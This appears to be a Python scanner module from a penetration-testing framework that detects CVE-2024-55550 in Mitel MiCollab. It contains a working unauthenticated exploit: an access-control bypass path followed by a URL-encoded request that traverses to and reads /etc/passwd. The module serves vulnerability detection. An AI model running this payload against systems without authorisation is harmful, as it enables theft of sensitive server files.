#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mitel MiCollab - Arbitary File Read Detection',
        'description': 'The Mitel Collab Arbitrary File Read vulnerability allows an unauthenticated attacker to read arbitrary files from the underlying file system on a Mitel Collab server. Exploiting this flaw involves sending specially crafted requests to the server, bypassing access controls and allowing the attacker to retrieve sensitive files.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'mitel', 'lfi', 'cmg-suite', 'auth-bypass', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/watchtowrlabs/Mitel-MiCollab-Auth-Bypass_CVE-2024-41713',
            'https://labs.watchtowr.com/where-theres-smoke-theres-fire-mitel-micollab-cve-2024-35286-cve-2024-41713-and-an-0day/',
            'https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-misa-2024-0029',
        ],
        'cve': 'CVE-2024-55550',
    }

    def run(self):
        path = '/npm-pwg/..;/usp/searchUsers.do'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('users', 'Network Element',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v=&isc_tnum=2'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='_transaction=%3Ctransaction+xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2F10%2FXMLSchema-instance%22+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CtransactionNum+xsi%3Atype%3D%22xsd%3Along%22%3E2%3C%2FtransactionNum%3E%3Coperations+xsi%3Atype%3D%22xsd%3AList%22%3E%3Celem+xsi%3Atype%3D%22xsd%3AObject%22%3E%3Ccriteria+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3E..%2F..%2F..%2Fetc%2Fpasswd%3C%2FreportName%3E%3C%2Fcriteria%3E%3CoperationConfig+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CdataSource%3Esummary_reports%3C%2FdataSource%3E%3CoperationType%3Efetch%3C%2FoperationType%3E%3C%2FoperationConfig%3E%3CappID%3EbuiltinApplication%3C%2FappID%3E%3Coperation%3EdownloadReport%3C%2Foperation%3E%3ColdValues+xsi%3Atype%3D%22xsd%3AObject%22%3E%3CreportName%3Ex.txt%3C%2FreportName%3E%3C%2FoldValues%3E%3C%2Felem%3E%3C%2Foperations%3E%3Cjscallback%3Ex%3C%2Fjscallback%3E%3C%2Ftransaction%3E&protocolVersion=1.0&__iframeTarget__=x\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'micollab_api:.*:.*',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Mitel MiCollab - Arbitary File Read detected', path=path)
            return True
        return False

